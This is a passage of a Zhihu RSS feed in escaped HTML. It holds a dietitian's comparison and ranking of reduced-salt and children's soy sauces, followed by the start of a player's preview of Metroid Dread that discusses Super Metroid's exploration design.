三井宝宝鲣鱼/昆布</b>：日本进口，属于调味汁而非酿造酱油，有两种口味。听名字就知道主打儿童市场。钠含量确实很低，两款产品均在500mg/15ml，口感上也非常讨巧，鲜里带甜，应该会很受孩子们喜欢。比如炖蛋的时候加一点味道应该是蛮灵的！</li>\n<li>\n<b>Bragg</b>：美国进口，同样属于调味汁，喷嘴的设计比较独特，控量方面具有优势。但是Brag的配料是真的另类，大豆蛋白+水，明显不同于酱油酿造的传统工艺。个人推断应该是水解大豆蛋白得到氨基酸的原理。口感吃起来的确是咸鲜味明显，但和我们习惯的酱油味道不一样。并且虽然产品明确说了不含盐，但钠含量换算后达到了960mg/15ml，在这批产品中算是高的。这样的产品根本不能手适合婴幼儿使用。这也提醒我们不要盲目听信一些进口产品的宣传，还是要回到减盐酱油的本质上来看待新鲜陌生事物。</li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-a96090cf42290213d66fce673edf9b29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-a96090cf42290213d66fce673edf9b29\" data-watermark-src=\"v2-a9ea765031b9f920ad91b31db063bbae\" data-private-watermark-src=\"v2-76b335577d11973f3ca0313b505079f8\"></p>\n<h2>二、评测维度</h2>\n<p>这次减盐酱油的评测内容主要涉及以下几个方面：</p>\n<h3>1、钠含量</h3>\n<p>钠含量是判断有没有减盐、减了多少盐的重要依据。通常普通酱油的钠含量在1000~1200mg/15ml左右，这个数据可以在产品的营养成分表里看到。 </p>\n<p>但是需要注意的是有的产品标示的是每15ml的钠含量，有的则是10ml、8ml等其他规格。因此要比较钠含量，那就必须统一规格。 </p>\n<p>这次评测的减盐酱油里，减盐的程度差异明显。我们以普通酱油1200mg/15ml的标准把32款酱油分了几个类别。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-85e408801b3d3bd4c97b082b0c07b21e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"505\" data-watermark=\"watermark\" data-original-src=\"v2-85e408801b3d3bd4c97b082b0c07b21e\" data-watermark-src=\"v2-30a6613bff3a41551a1f9c2a7144a475\" data-private-watermark-src=\"v2-fb847ff93eb5c76ff4f1e0af282b923d\"></p>\n<p>至于4款调味汁产品，三井宝宝的2款产品钠含量在500mg左右。而雀巢美极减盐鲜味汁950mg，Bragg调味汁960mg本质上也是减了个寂寞。 </p>\n<p><b><i>根据《预包装食品营养标签通则》，钠含量是允许有误差的，≤120%的标示值都是允许的。所以每15ml的酱油里相差几十mg钠可能意义并不大。</i></b></p>\n<p><br></p>\n<h3>2、氨基酸态氮含量</h3>\n<p>酱油最主要的目的就是提供鲜味，所以酱油里氨基酸态氮含量是评判品质好坏的关键指标。如果在减盐的基础上，依然能保证高氨基酸态氮含量，那才是有意义的「减盐酱油」。否则减盐的同时也减鲜，吃起来不给力反而要加的更多，减盐的意义也就不在了。 </p>\n<p>根据国标，氨基酸态氮含量≥0.8g的为特级酱油，≥0.7g是一级酱油，≥0.55g是二级酱油，≥0.4g是三级酱油。 </p>\n<p>在28款产品中，只有3款产品没有达到国标特级标准，分别是厨邦小淘气（0.55）、李锦记薄盐生抽（0.55）和李锦记薄盐醇味鲜（0.7）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4f4662310cac29af154bbfde80cdc0f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-4f4662310cac29af154bbfde80cdc0f2\" data-watermark-src=\"v2-48b52e5e5162a2e0bc83e7b24917b85a\" data-private-watermark-src=\"v2-87af27cc5d0bca770bfe9d2ddc391e9d\"></p>\n<p><b>令人惊喜的是，有22款产品的氨基酸态氮含量高于国标特级标准，分别是：</b></p>\n<p>禾泱泱昆布款（1.3）、禾泱泱黑豆款（1.2）、味事达薄盐味极鲜（1.2）、东古淡盐一品鲜（1.2）、信芳园古方原酿（1.1）、欣和六月鲜轻8g（1）、欣和六月鲜轻10g（1）、玉兔秋田满满（1）、爷爷的农场（1）、小鹿蓝蓝（1）、海天拌饭酱油（1）、海天淡盐头道（1）、玉兔应物喜饭（1）、珠江桥牌轻盐（1）、李锦记味极鲜薄盐（1）、佳佳减盐生抽（1）、海天裸酱油（1）、加加小加酱油（1）、欣和六月鲜轻12g牡蛎（0.9）、欣和六月鲜轻12g昆布（0.9）、欣和禾然有机亲宝（0.9）、欣和禾然有机乐童（0.9）。</p>\n<p><b>但是好的减盐酱油，光看氨基酸态氮可不行。厂家为了提高氨基酸态氮含量，可以做的小动作太多了......所以一定要结合配料表才行！（我们后面就来细说啦！）</b></p>\n<h3>3、配料表</h3>\n<p><b>酿造酱油的基础配料是：水、盐、大豆和或小麦，除此以外的配料都是非必需的</b>。在这次评测的产品中，有10款产品只有基础配料，非常纯粹。分别是：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8e18239bdab28a67d052b00aae5f04dc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-8e18239bdab28a67d052b00aae5f04dc\" data-watermark-src=\"v2-42fcdd96412ce31d11f76bf020a71a32\" data-private-watermark-src=\"v2-7df404f9c4a9c55fe456905a00d8b917\"></p>\n<p><b><i>欣和六月鲜轻8g；欣和六月鲜轻10g；信芳园古方原酿；小鹿蓝蓝（玉兔代工）；</i></b></p>\n<p><b><i>玉兔秋田满满；玉兔应物喜饭；爷爷的农场（食圣代工）；欣和禾然乐童；欣和禾然亲宝；禾泱泱黑豆款。</i></b> </p>\n<p>除了上述10款产品只含有基础配料外，剩下18款产品都添加了其它成分，具体的目的和作用如下：大致是增鲜（增味剂）、调味（甜味剂、酸度调节剂）、防腐（防腐剂）、上色（着色剂）等。总之，这些都不是必需的。</p>\n<h3>4、主观口感</h3>\n<p>减盐酱油好不好吃、和普通酱油的口感区别在哪里、吃起来是不是觉得淡？这些主观口感我和钱爸也做了体验。但由于口感是主观感受，并且不同场景下的感觉是不同的，比如凉拌、烹饪、佐餐时带来的感觉是不同的，大家参考就好。这一部分就不放在文字里了，感兴趣的小伙伴可以去视频里看看。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98657251c19f17e1df7be2420eef0b65_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-98657251c19f17e1df7be2420eef0b65\" data-watermark-src=\"v2-32f597237e47044e801cea6595547182\" data-private-watermark-src=\"v2-28863b92d2188696aefd001ef62c451d\"></p>\n<h3>5、容量选择</h3>\n<p>很多长辈在选购酱油时，也许会在意「减盐」两字，但真的在烧菜时却又嫌太淡反而会加的过多。这种习惯，会让他们觉得大容量包装的才经用，其实反而违背了购买「减盐酱油」的意义。</p>\n<p>所以我认为「减盐酱油」不应该盲目追求大容量，够用就好。 </p>\n<p>大容量规格还有一个最大的弊端，就是长时间的存放容易导致酱油变质。变质并非一定是酱油坏了不能吃了，而是过了酱油的最佳赏味期限。从这两点来看，容量上的选择应该遵循家庭酱油的用量来决定，通常1个月左右用完最佳，并且拆封后建议冷藏保存。这次评测的28款酱油容量均没有超过500ml，值得表扬。但有个别产品是有量贩装的，在选购时记得辨别。</p>\n<p><br></p>\n<h3>6、价格/性价比</h3>\n<p>酱油作为日用调味料，价格也是很多人考虑的因素。这次评测的酱油价格从几元到上百元不等，如果在减盐保鲜的同时，也能兼顾性价比，那自然能受到更多人的欢迎。 </p>\n<p>这次28款产品里，单价（每100ml的价格）区间为1.8元~86元，可谓天差地别。最贵的禾泱泱和最便宜的李锦记薄盐生抽，单价差了近50倍… </p>\n<p>不同人群对价格的敏感程度也不同，所以只看价格并没有太多的参考意义，需要结合上述其它维度综合判断。</p>\n<h2>三、评分环节</h2>\n<p>这部分的打分是我们根据自己的经验和一定的标准设置的，但仍具有一定的主观性，目的在于让大家可以通过数据更直观的去了解一款减盐酱油的综合实力。但是这毕竟不是科学严谨的实验和论文，仅供参考。 </p>\n<p>由于定位儿童酱油的产品，几乎清一色的采用了有机原料，价格上也是全面碾压普通减盐酱油。因此在评分环节，我还是将儿童酱油单独列出来。 </p>\n<h3><b>评分规则：</b></h3>\n<p><b>钠含量得分（满分10分，钠含量越低分值越高）</b></p>\n<p>第一梯队的产品得10分；</p>\n<p>第二梯队得8分；</p>\n<p>第三梯队得6分；</p>\n<p>第四梯队得4分；</p>\n<p>第五梯队得2分。</p>\n<h3><b>氨基酸态氮得分（满分10分，氨基酸态氮越高分值越高）</b></h3>\n<p>国标特级10分；</p>\n<p>国标1级8分；</p>\n<p>国标2级6分。</p>\n<h3><b>配料表得分（满分10分）</b></h3>\n<p>只有基础配料的10分；</p>\n<p>每增加<b>一类</b>非必需配料的-1分；</p>\n<p><b><i>同一类的成分达到的目的大致是相同的，比如白砂糖和葡萄糖就属于添加糖一类物质；酵母抽提物和谷氨酸钠就属于增鲜的一类物质。</i></b></p>\n<h3><b>特殊加分项：</b></h3>\n<p>氨基酸态氮高于国标特级（0.8）的产品每高0.1加1分。最后得到了如下表单：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d5b4a26b5d34ac2060219e5ec4c20983_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"365\" data-watermark=\"watermark\" data-original-src=\"v2-d5b4a26b5d34ac2060219e5ec4c20983\" data-watermark-src=\"v2-d424f3971e3aac5e865fca3919f627c0\" data-private-watermark-src=\"v2-abaf449a55857dbd9daa3429f7b0bfc9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-34288daa58f5391c380879774b15651d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"213\" data-watermark=\"watermark\" data-original-src=\"v2-34288daa58f5391c380879774b15651d\" data-watermark-src=\"v2-7ae63d818fe6c90e81a8edf3c033a529\" data-private-watermark-src=\"v2-960152379cc11e193af3a6d47e748244\"></p>\n<h2>四、结论及推荐款</h2>\n<h3>减盐酱油榜单：</h3>\n<p>1、欣和六月鲜轻系列8g（32分）</p>\n<p>2、欣和六月鲜轻系列10g（32分）</p>\n<p>3、玉兔信芳园古方原酿（31分）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-183a45800c93922cb49620484eaf01da_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"311\" data-watermark=\"watermark\" data-original-src=\"v2-183a45800c93922cb49620484eaf01da\" data-watermark-src=\"v2-14bdf00b819a2ace197952ee00408fec\" data-private-watermark-src=\"v2-0c00c703b942ce34b696bce46c291ee5\"></p>\n<p>定位减盐酱油的产品中，欣和六月鲜的轻系列8g和10g两款产品无论从钠、氨基酸态氮还是配料表方面都无可挑剔。玉兔信芳园古方原酿虽然钠含量略不如前两者，但氨基酸态氮含量也略高。这3款产品是值得推荐的减盐酱油。 </p>\n<p>口感方面，玉兔该款产品比轻系列的两款更为浓郁，个人感觉有些过头，不太适合凉拌，更适合加热烹饪时使用。</p>\n<h3>儿童酱油榜单：</h3>\n<p>1、禾泱泱昆布款（34分）</p>\n<p>2、秋田满满、小鹿蓝蓝、爷爷的农场（30分）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6ae9e0763970759ae3a6e29cecab4cd6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"311\" data-watermark=\"watermark\" data-original-src=\"v2-6ae9e0763970759ae3a6e29cecab4cd6\" data-watermark-src=\"v2-58284cb80587a493dad8dfc161c13c03\" data-private-watermark-src=\"v2-bc96ad0639a9dbb9ddf13e0089d86a52\"></p>\n<p>别急下单！虽然禾泱泱昆布款得分第一，但我却不太推荐。 </p>\n<p>定位儿童酱油的产品里，除了海天的儿童拌饭酱油配料表不太推荐以外（添加剂很多），其余产品的配料表都非常不错，在这方面体现出了「儿童酱油」应有的水准。 </p>\n<p>禾泱泱昆布款的氨基酸态氮含量非常高，所以综合的得分是最高的。但这款也是除了海天儿童拌饭酱油外，唯一一款加了糖。 </p>\n<p>但不得不客观地说，酿造时间在1年以上的酱油，几乎全都加了糖。比如我之前被朋友安利的耗时5年酿造的「老恒和太油」，在没有添加增鲜成分的前提下，氨基酸态氮含量高达1.5，配料里同样也加了糖，这可能与酿造工艺以及口感方面的调和有关。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ba81bac1e622237fa4828790c3286961_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"437\" data-rawheight=\"347\" data-watermark=\"watermark\" data-original-src=\"v2-ba81bac1e622237fa4828790c3286961\" data-watermark-src=\"v2-2ee4626f35962778122c6c07fedca2a6\" data-private-watermark-src=\"v2-c0c80b8bbcb04df79cdf87693c1a89e2\"></p>\n<p>禾泱泱昆布款的得分虽然第一，但禾泱泱黑豆款却拉胯了。虽然氨基酸态氮含量同样也很高（1.2），但是高达941mg的钠，不知道减盐减在了哪里。 </p>\n<p>不过别看昆布款得分不低，但最致命的问题是价格。比同类产品贵了3~5倍的售价，已经让绝大多数家长望而却步了。这个价格差是非常明显的，考虑性价比因素的话，禾泱泱产品的优势荡然无存，排在后面的一堆产品反而会是更亲民的选择。 </p>\n<p><b>然后我们看下第二名的几款「儿童酱油」。</b> </p>\n<p>秋田满满、小鹿蓝蓝两款均是玉兔代工生产的；爷爷的农场则是食圣生产。玉兔和食圣这两家山东淄博和山东烟台的厂家，给很多互联网新兴品牌做代工生产，也就是贴个牌子而已。另外，妈妈圈里热门的<u>麦乐诗、蛮小乖、宝宝馋了</u>等都是出自这两家。这其实意味着这些新兴的儿童酱油品牌，质量是几乎一样的，看准哪个促销买就行了。 </p>\n<p>欣和禾然的两款放在所有的减盐酱油里，29分的得分还是挺高的，和专做儿童市场的新兴品牌也并没有显著的差距。但是和自家的六月鲜轻系列8g、10g对比，除了有机卖点，似乎找不到花更多的钱的理由了。</p>\n<h3>性价比减盐榜单：</h3>\n<p>这是一份额外的榜单。主要适合对价格较为敏感的消费者，同时既要考虑减盐也保证鲜度，同时配料表里的额外成分尽可能偏少。 </p>\n<p><b>李锦记薄盐头道</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-09f5f09575019c917d4970c6e762d990_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"311\" data-watermark=\"watermark\" data-original-src=\"v2-09f5f09575019c917d4970c6e762d990\" data-watermark-src=\"v2-3f5cdf0085bd5d63fa0a6de4927e9091\" data-private-watermark-src=\"v2-05d062ac394a7a9bc81b0997cbca4206\"></p>\n<p>这也是唯一一款既用到了大豆也用到了脱脂大豆的产品，可以认为是为了控制成本。钠含量647mg/15ml，头道，2.4元/100ml，3种非必需配料，这些综合一起后是唯一一款值得推荐的性价比减盐产品。</p>\n<h2>写在最后（非常重要）</h2>\n<p>最后还是想说说关于「减盐酱油」和所谓的「儿童酱油」的看法。</p>\n<h3><b>01【关于减盐酱油】</b></h3>\n<p>首先，作为营养师，我认为<b>「减盐酱油」</b>的存在的确是有意义的。要知道减盐50%的酱油相比普通酱油，意味着你可以每天多用30ml。这对于大多数无法掌控酱油添加量的人来说，在减少钠摄入方面无疑是极大的福音和切实可行的办法。 </p>\n<p>但有个很现实的问题是，目前没有规范的针对「减盐」的定义，这意味着减盐只是商家的宣传内容而已。各家推出的减盐产品其实都只是跟自家的普通酱油作对比。这里就会出现一个问题，减盐40%的A酱油，可能比减盐25%的B酱油，钠含量反而高。因为参照的对比物不一样。所以买减盐酱油的时候，可别只顾着「减盐XX%」，还是看看营养成分表里的钠含量靠谱呀~</p>\n<p>这次横评其实也发现了减盐酱油能做到减盐的同时保证鲜度，并且有多款产品可以在不添加任何增鲜成分的前提下，达到国标特级甚至更高的氨基酸态氮含量。所以，我们可以说好的酱油也是存在的。其实酱油本身用的就不应该多，花多一点的钱，买点好的减盐酱油给家里的掌勺人、爸妈、孩子，这也是健康饮食、减盐减钠的具体表现。</p>\n<h3><b>02【关于儿童酱油】</b></h3>\n<p>说到<b>「儿童酱油」</b>，虽然在同类产品里我做了得分榜单，但是和普通减盐酱油相比，儿童酱油除了包装更儿童化，酱油本身并没有本质的不同，价格却因为有机以及儿童卖点随之翻倍。 </p>\n<p>我一直提倡1岁后的孩子应尽早融入清淡的家庭饮食，这里面也包括了调味品的通用，所以我不认为儿童酱油是个必需品。 </p>\n<p>另外，大多互联网新兴儿童酱油品牌都出自山东的两家调味料的企业：山东淄博的玉兔和山东烟台的食圣。这两家给很多互联网新兴品牌做代工生产，也就是贴个牌子而已。至于其他一些在妈妈群里很火的品牌，比如「麦乐诗」也是食圣生产的。 </p>\n<p>此外，「蛮小乖」则是玉兔生产的。总的来说，目前国家是真的没有「儿童酱油」的标准，不要被包装、宣传所迷惑。如果真的是打算给孩子用的，还是要看看到底钠少了多少。</p>\n<p>别看酱油是个小物件，但酿造酱油的技术根本不可能速成。一下子冒出来那么多新兴品牌其实也能明白都是代工贴牌的产品了。 </p>\n<h3><b>03【关于酱油的口感和参数】</b></h3>\n<p>有的酱油参数上钠含量很低，但口感却很咸，咸的发苦。有的酱油虽然加了糖，从配料上似乎不那么纯粹，但口感却非常舒服。所以我觉得酱油作为调味品，还是要选择自己喜欢的，当然如果前提是希望达到减盐的目的，那就在钠含量低的产品里去选择适合自己口味的。 </p>\n<p>对于小朋友来说也是一样的，没有必要为了「绝对的低钠」和「绝对的配料表纯粹」去挑选产品，小朋友同样要选择他们喜欢的，控制总的使用量更重要。 </p>\n<p>比如我一开始在搜集产品数据的时候，我对三井宝宝的两款调味汁有点嗤之以鼻，觉得这不就是在酱油的基础上加了一些东西稀释后得到的嘛！但实际的口感却让我非常惊讶，这种口味是真的挺讨巧的，尤其是在给孩子佐餐的时候。并且钠含量也只有500mg左右，我个人是觉得这也是一个意外的收获。 </p>\n<h3><b>04【酱油中的酒精】</b></h3>\n<p>如果还有什么想说的，那就谈谈酱油里的「酒精」吧。这次的所有产品里，其实只有万字在配料表里额外添加了酒精。但其实几乎所有的酿造酱油都含有酒精，并且可能含量还不低，可以达到2~3%。这是因为酱油在酿造过程中需要酵母菌参与，在长时间的酿造中大豆和小麦会逐渐产生酒精。 </p>\n<p>从这点上来说，酱油不要给1岁内的孩子使用，1岁后的孩子也尽量要少用，尤其是凉拌、佐餐时，酱油并不是必备的。少用酱油本身也是减少钠摄入来源的一种有效措施，也有利于孩子培养清淡口味。 </p>\n<p><b>好啦，如果你喜欢这篇文章，请记得给我下反馈哟，也可以在留言区告诉我你的感受。</b></p>\n<blockquote>\n<b>我是</b> <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e5f68460cb8972abe04d646756a137c6\" data-hash=\"e5f68460cb8972abe04d646756a137c6\" data-hovercard=\"p$b$e5f68460cb8972abe04d646756a137c6\">@菜妈和钱爸</a><b>，母婴盐究员，儿童教育优秀回答者，复旦大学营养学硕士，中国注册营养师，两个孩子的妈妈。</b>\n</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mammycai?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">菜妈和钱爸</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/26044502/answer/2159519266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">108 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/308123646?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么味极鲜比酱油好吃？</a><br><a href=\"http://www.zhihu.com/question/402892361?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">0添加酱油真有那么好？好酱油怎么选？</a><br>\n","link":"http://www.zhihu.com/question/26044502/answer/2159519266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价 10 月 8 日正式发售的 Switch OLED 的护航游戏《密特罗德 生存恐惧》？","date":"2021-10-08 05:29:00","description":"\n<p>刚刚玩了两个小时，难度一般，存档点设置也比较充分，一开始的操作教程也比较详细，操作极其流畅，键位设计也很合理。</p>\n<p>现在看来游戏的难度集中在BOSS战与EMMI区，不过进入这两个环节前都有自动存档（修正：这只是临时存档，死亡自动回到附近，但重新开始游戏时将回到上一个手动存档点）。一开始可能的确有点难（主要是不熟悉操作），练几次掌握规律就行(emmi区熟了都可以绕着EMMI玩 )</p>\n<hr>\n<p>《密特罗德/银河战士 生存恐惧》媒体评分解禁，当前MC平均88分，收录47家媒体。</p>\n<p>IGN 9分，GameSpot 8分，GameInformer 9分。 ​​​</p>\n<hr>\n<p>目前游戏在国内热度很低（国外热度还行，亚马逊上卖得很好，美亚已经出现了实体版预售一空的情况），电商平台价格也很稳定，知乎上也鲜有人提过与<b>《密特罗德 生存恐惧》</b>（Metriod Dread/Metriod 5  下面简称<b>M5</b>）相关的问题。于是这次打算用自己拙劣的语言自问自答一下，也算是在游戏发售前先占个坑。</p>\n<p>M5要等到国庆结束后的10月8日正式发售（日企果然不懂什么叫国庆节与打工人……），所以作为一个密特罗德粉丝，先简要谈谈对本作的期待吧，游戏解锁后再进行对游戏内容的简要评测。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2d23522daed7fd0ab543efd1f547c4bf_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2d23522daed7fd0ab543efd1f547c4bf\" data-watermark-src=\"v2-ee384af3c062b830ce732f9bc3f601a0\" data-private-watermark-src=\"v2-6ba3d58a52c2016ba1c999aacb76c986\"></p>\n<p><br></p>\n<hr>\n<p>当我观看完了所有的介绍视频时，我对M5产生的预期是“<b>一作同时拥有《超级密特罗德》的探索感、《融合》的恐惧感、《萨姆斯归来》的动作感的密特罗德</b>”。</p>\n<p>我知道这样的预期是不科学的，因为一个同时拥有这三种特质的Metroidvania游戏是不可能存在的。如果M5真就同时做到了这三点，那一举成为比肩《超级密特罗德》的新里程碑式银河城游戏应该不成问题。不过就算M5没达到我的预期，那也有《萨姆斯归来》托底（总不可能比萨归差吧）。</p>\n<p>现阶段，无论是官方给出的实机预告，还在媒体进行的早期试玩评测，双方给出的信息是极其正面的，因而一次次地拔高了我的期待值（虽然真的很想自行降低期望值，免得吹死婊活），我对M5的预期也从“一部略好于萨归的作品”变成了“同时拥有三种特质的系列正统续作”。</p>\n<p>下面具体说说我的预期究竟是怎么来的，顺便介绍一下这三部老密特罗德作品。</p>\n<hr>\n<p><img src=\"https://pic1.zhimg.com/v2-687980e2d70006ba558f0750b510b24f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"《超级密特罗德》\" data-watermark=\"watermark\" data-original-src=\"v2-687980e2d70006ba558f0750b510b24f\" data-watermark-src=\"v2-bbcfea3c32b63e3946cd467bf68323a4\" data-private-watermark-src=\"v2-96f7584d73a4d658059e1cccaba51a6b\"></p>\n<h2>《超级密特罗德》的探索感</h2>\n<p>《超级密特罗德》是一款伟大的游戏。</p>\n<p>毫不客气地说，这款1994年发售于SNES平台的\"古董游戏\"，直至今天依然是最好的Metroidvania游戏。</p>\n<p>作为任天堂密特罗德系列的正统第三作，它不仅一举打破了玩家群体对任天堂只会出妇孺游戏的刻板印象，其氛围之恐怖，背景音之惊悚，使其一度成为不少从SNES入坑的玩家的“童年阴影”。同时，《超级密特罗德》实现了对系列前作的全方面超越，无论是强化的音画效果，空前复杂的联通式大地图，还是打磨精良的操作手感，都将这个系列推上了一个全新的高度。</p>\n<p>作为银河城类型的开拓者与完善者，《超密》也一举成为了日后无数类银河城游戏的学习模板，其优秀的设计理念也影响了诸如《月下夜想曲》与《公里边缘》等游戏的诞生，成为了玩家们争相追捧的神作之一。</p>\n<p>而《超级密特罗德》之所以伟大，其核心在于它<b>高自由度下的惊人的探索感</b>，可以说《塞尔达传说 旷野之息》在2017年所带给玩家的一切，它在23年前就已经震撼过玩家一次了。</p>\n<p><b>对于Metroidvania游戏来说，对玩家一定程度上的限制是必须的</b>，比如给出唯一的探索道路，或者设置一个只有高等级才打的过的BOSS，这样做能够更好地控制流程的推进，把握游玩的节奏，也有便于设计一些流程脚本化的演出，更好地完成叙事任务，保证玩家在制作者规划好的道路上行进。</p>\n<p>《超级密特罗德》也不例外：<b>在游戏初期，主线推进的次序基本上是唯一的</b>（当然高手可以用高阶技巧走出不同的道路），看似左右都可以走，实际上右边因为没有球炸而过不去；明明左右都是门，却只有底下的那个才能通行。走到一个未知的地方，想返回却发现回去的路被堵上了，只能硬着头皮往前走，最后发现前方有裂缝的砖块是可以用子弹清除的，由此找到了新的道路……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9e8532aa43b826eeeb81744e6b0ec2b0_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"逛了半天才发现，只有最下面的门能走，其他的门不是通向一条死路就是直接打不开\" data-watermark=\"watermark\" data-original-src=\"v2-9e8532aa43b826eeeb81744e6b0ec2b0\" data-watermark-src=\"v2-d7ec47e3d9be0ef48ab3a20fbcba280b\" data-private-watermark-src=\"v2-b5c4c9807bc66caacbe94b43287dd1bd\"></p>\n<p>制作组在对初期流程进行限制的同时，很聪明地使用了一些<b>“无言”的指引</b>：有裂缝的砖块，不同颜色的门，地图上多出来的房间等等，让玩家以为是凭借自身的智慧探索与发现新区域的，而没有那种被制作组牵着鼻子玩游戏的感觉。</p>\n<p>不仅仅是初期流程，除了游戏开头介绍故事背景时用了文字说明外，《超密》几乎不存在任何文字指引，这与很多银河城游戏生怕你找不到路而疯狂给你文字指引的设计截然不同。取而代之的是大量精心设计的一些地形与物体指引，对于一些比较难用能力，制作组还非常贴心地设计了一些天赋异禀的“神奇动物”们，它们会演示这些能力的使用方法，从而大大提高玩家的探索能力。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75f7a43add38ad799d27d7860460262a_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"冲刺界的“百米冠军”——绿鸵鸟\" data-watermark=\"watermark\" data-original-src=\"v2-75f7a43add38ad799d27d7860460262a\" data-watermark-src=\"v2-f93d4939f23652e40f1f83c9fab00cc2\" data-private-watermark-src=\"v2-e997ae64083889b67e51c97c3686e8ac\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b766a4f14ab9ab542da1fededb307b95_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"成群结队地羞辱不会踢墙跳的你\" data-watermark=\"watermark\" data-original-src=\"v2-b766a4f14ab9ab542da1fededb307b95\" data-watermark-src=\"v2-538d9b1a3cd902ab33688bb99cd00a07\" data-private-watermark-src=\"v2-b1e6106bfd9173873dca5d79cd416458\"></p>\n<p>当然，仅仅是一味地玩家的流程进行必要的限制，并采用一些巧妙的指引手段，《超级密特罗德》还不足以成为一部神作。</p>\n<p>所谓的“探索”是真正属于玩家自己的，而不是被制作组刻意安排好的，营造出来的“探索感”。制作组也非常清楚这一点，没有一直“圈养”着玩家，他们一直在等待一个机会，一个可以真正让玩家突破栅栏的机会。</p>\n<p>于是，当你在熔岩地区拿到加速鞋与电光索，又经过重重阻碍，打过几个BOSS拿到冰冻枪与超级炸弹后，你会惊奇地发现之前无法通过的阻碍可以用新能力消除，冰冻枪甚至可以通过冰冻小怪来造出一条蜿蜒上升的道路。最后，玩家在地下绕了半天，爬上地表后又回到了最初飞船停靠的地方，你会发现这刚刚经历的一切只是制作组设计的大型新手教程。终于，制作组在这时放开了双手，仿佛你已经具备了足够的能力，是时候让你开始一段“真正的探索”了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-045800a775f96b4ecc53b9a163063127_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"再次回到飞船时，萨姐的装甲也从橙色变成了与飞船颜色一致的黄色，预示着游戏已经迎来中后期\" data-watermark=\"watermark\" data-original-src=\"v2-045800a775f96b4ecc53b9a163063127\" data-watermark-src=\"v2-b602fcd37e5af644e2a21dbc95176e3e\" 